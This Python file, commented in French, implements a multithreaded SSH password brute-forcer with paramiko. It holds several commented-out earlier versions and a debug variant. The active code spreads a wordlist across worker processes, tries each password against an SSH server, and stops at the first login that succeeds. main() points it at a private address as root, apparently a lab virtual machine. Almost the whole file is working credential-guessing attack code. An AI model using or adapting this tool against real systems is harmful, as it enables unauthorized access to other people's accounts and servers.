import threading, time, datetime, paramiko
from wordlist import create_wordlist
import multiprocessing
from fabric import Connection

# def brute_force_ssh_thread(hostname, port, username, password_list):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#     # Tester chaque mot de passe dans la liste
#     for password in password_list:
#         try:
#             client.connect(hostname=hostname, port=port, username=username, password=password)
#             print(f"Mot de passe trouvé: {password}")
#             client.close()
#             return password
#         except:
#             client.close()
#             pass


# def brute_force_ssh(hostname, port, username, password_list, num_threads=2):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une liste de threads
#     threads = []
#     for i in range(num_threads):
#         t = threading.Thread(target=brute_force_ssh_thread, args=(hostname, port, username, password_list))
#         threads.append(t)
#         t.start()

#     # Attendre que tous les threads se terminent
#     for t in threads:
#         t.join()
















# def brute_force_ssh_thread(hostname, port, username, password_list, password_index):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#     # Tester chaque mot de passe dans la liste
#     try:
#         password = password_list[password_index]
#         print(f"Trying: {password}")
#         client.connect(hostname=hostname, port=port, username=username, password=password)
#         print(f"Mot de passe trouvé: {password}")
#         client.close()
#         return password
#     except:
#         client.close()
#         pass


# def brute_force_ssh(hostname, port, username, password_list, num_threads=2):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une liste de threads
#     threads = []
#     for i in range(num_threads):
#         # Diviser la liste de mots de passe en deux
#         start_index = i * (len(password_list) // num_threads)
#         end_index = (i + 1) * (len(password_list) // num_threads)
#         if i == num_threads - 1:
#             end_index = len(password_list)

#         # Créer le thread avec la sous-liste de mots de passe
#         t = threading.Thread(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, start_index))
#         threads.append(t)
#         t.start()

#     # Attendre que tous les threads se terminent
#     for t in threads:
#         t.join()







































# def brute_force_ssh_thread(hostname, port, username, password_list, next_password_index, found_event):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#     while True:
#         # Vérifier si un mot de passe a déjà été trouvé
#         if found_event.is_set():
#             client.close()
#             return

#         # Récupérer l'index du prochain mot de passe à tester
#         with next_password_index.get_lock():
#             i = next_password_index.value
#             # Si tous les mots de passe ont été testés, le thread se termine
#             if i >= len(password_list):
#                 client.close()
#                 return
#             # Mettre à jour l'index pour le thread suivant
#             next_password_index.value += 1

#         password = password_list[i]
#         try:
#             client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3, banner_timeout=3)
#             print(f"Mot de passe trouvé: {password}")
#             found_event.set()
#             client.close()
#             return password
#         except:
#             print(f"Mot de passe incorrect: {password}")
#             client.close()
#             pass


# def brute_force_ssh(hostname, port, username, password_list, num_threads=8):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une variable partagée pour l'index du prochain mot de passe à tester
#     next_password_index = multiprocessing.Value('i', 0)

#     # Créer un Event pour signaler la fin de la recherche
#     found_event = multiprocessing.Event()

#     # Créer les threads pour tester les mots de passe
#     threads = []
#     for i in range(num_threads):
#         thread = multiprocessing.Process(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, next_password_index, found_event))
#         thread.start()
#         threads.append(thread)

#     # Attendre que tous les threads se terminent
#     for thread in threads:
#         thread.join()

#     # Si le mot de passe est trouvé, retourner le mot de passe
#     if found_event.is_set():
#         return password

#     # Si aucun mot de passe n'a été trouvé, retourner None
#     return None
































def brute_force_ssh_thread(hostname, port, username, password_list, next_password_index, found_event, password_queue):
    """
    Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    while True:
        # Vérifier si un mot de passe a déjà été trouvé
        if found_event.is_set():
            # client.close()
            return

        # Récupérer l'index du prochain mot de passe à tester
        with next_password_index.get_lock():
            i = next_password_index.value
            # Si tous les mots de passe ont été testés, le thread se termine
            if i >= len(password_list):
                # client.close()
                return
            # Mettre à jour l'index pour le thread suivant
            next_password_index.value += 1

        password = password_list[i]
        try:
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=200, banner_timeout=200)
            print(f"Mot de passe trouvé: {password}")
            password_queue.put(password)
            found_event.set()
            client.close()
            return
        except:
            print(f"Mot de passe incorrect: {password}")
            client.close()
            pass


def brute_force_ssh(hostname, port, username, password_list, num_threads=4):
    """
    Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
    Utilise le multithreading pour accélérer le processus.
    """
    # Créer une variable partagée pour l'index du prochain mot de passe à tester
    next_password_index = multiprocessing.Value('i', 0)

    # Créer un Event pour signaler la fin de la recherche
    found_event = multiprocessing.Event()

    # Créer une queue pour stocker le mot de passe trouvé
    password_queue = multiprocessing.Queue()

    # Créer les threads pour tester les mots de passe
    threads = []
    for i in range(num_threads):
        thread = multiprocessing.Process(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, next_password_index, found_event, password_queue))
        thread.start()
        threads.append(thread)

    # Attendre que tous les threads se terminent
    for thread in threads:
        thread.join()

    # Si un mot de passe a été trouvé, récupérer le mot de passe et le retourner
    if not password_queue.empty():
        password = password_queue.get()
        return password

    # Si aucun mot de passe n'a été trouvé, retourner None
    return None











































































# def brute_force_ssh_thread(hostname, port, username, password_list, next_password_index):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """

#     while True:
#         # Vérifier si un mot de passe a déjà été trouvé
#         # if found_event.is_set():
#         #     # client.close()
#         #     return

#         # Récupérer l'index du prochain mot de passe à tester
#         print("1")
#         with next_password_index.get_lock():
#             i = next_password_index.value
#             # Si tous les mots de passe ont été testés, le thread se termine
#             if i >= len(password_list):
#                 # client.close()
#                 return
#             # Mettre à jour l'index pour le thread suivant
#             next_password_index.value += 1

#         print("2")
#         password = password_list[i]
#         try:
#             print(("10"))
#             with paramiko.SSHClient() as client:
#                 print("11")
#                 print(password)
#                 # client.set_missing_host_key_policy(paramiko.DefaultMissingHostKeyPolicy())
#                 print("12")
#                 client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3, banner_timeout=200)
#                 print("13")
#                 print(f"Mot de passe trouvé: {password}")
#                 print("14")
#                 # found_event.set()
#                 print("15")
        
#             # return password
#         # except (paramiko.ssh_exception.SSHException, EOFError, ConnectionResetError) as e:
#         except:
#             print("Not works")

#             # client.close()
#             # print("dessssssssssssssssssssouuuuuuuuuuuuusssssssssssssssssssssssssss")
#             # print(str(e))
#             # if "Error reading SSH protocol banner" in str(e) or "Error reading SSH protocol banner[Errno 104] Connection reset by peer" in str(e):
#             #     print("Il y a une erreur")
#             # elif "Authentication failed." in str(e):
#             #     print("Mot de passe incorrect : " + password)
#             # else:
#             #     print("other")
#             #     pass

# def brute_force_ssh(hostname, port, username, password_list, num_threads=8):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une variable partagée pour l'index du prochain mot de passe à tester
#     print("3")
#     next_password_index = multiprocessing.Value('i', 0)

#     # print("4")
#     # # Créer un Event pour signaler la fin de la recherche
#     # found_event = multiprocessing.Event()

#     print("5")
#     # Créer les threads pour tester les mots de passe
#     threads = []
#     for i in range(num_threads):
#         thread = multiprocessing.Process(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, next_password_index))
#         print("6")
#         thread.start()
#         print("7")
#         threads.append(thread)

#     # Attendre que tous les threads se terminent
#     for thread in threads:
#         print("8")
#         thread.join()

#     # Si le mot de passe est trouvé, retourner le mot de passe
#     # if found_event.is_set():
#     #     return password

#     # Si aucun mot de passe n'a été trouvé, retourner None
#     return None


def main():

    wordlist = create_wordlist("passwords.txt")
    print(wordlist)


    test = brute_force_ssh("172.17.49.11", 22, "root", wordlist, 5)
    print(test)


    
    # for password in wordlist:
    #     try:
    #         # print("1")
    #         ssh = paramiko.SSHClient()
    #         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #         print("2")
    #         ssh.connect(hostname="172.17.49.11", port=22, username="root", password=password, timeout=200, banner_timeout=200)
    #         print("3")
    #         # c = Connection("172.17.49.11", port=22, user="root", connect_kwargs={"password": password, "timeout": 200, "banner_timeout": 200, auth_timeout: 200})
    #         # c.open()
    #         print('Connexion réussie avec le mot de passe {}'.format(password))
    #         # Faire d'autres opérations sur la machine distante ici
    #         # ...
    #         # Fermer la connexion
    #         # c.close()
    #         ssh.close()
    #         # sys.exit(0)
    #     except Exception as e:
    #         # Si la connexion échoue, passer au mot de passe suivant
    #         print('Erreur lors de la connexion avec le mot de passe {}: {}'.format(password, str(e)))
    #         ssh.close()
    #         continue

if __name__ == '__main__':
    main()